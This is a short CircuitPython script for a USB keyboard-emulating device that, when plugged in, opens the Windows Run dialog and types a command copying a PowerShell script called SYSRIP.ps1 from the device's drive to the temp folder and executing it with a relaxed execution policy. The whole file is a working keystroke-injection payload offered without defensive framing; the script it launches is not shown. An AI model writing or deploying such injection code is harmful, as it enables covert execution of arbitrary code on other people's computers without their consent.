import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
DRIVE_LETTER = "D"  
command = (
    'cmd /c copy "{drv}:\\SYSRIP.ps1" "%TEMP%\\SYSRIP.ps1" && '
    'powershell -NoProfile -ExecutionPolicy RemoteSigned -File "%TEMP%\\SYSRIP.ps1"\n'
).format(drv=DRIVE_LETTER)
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
time.sleep(0.7)
kbd.press(Keycode.WINDOWS, Keycode.R)
kbd.release_all()
time.sleep(0.12)
layout.write(command)
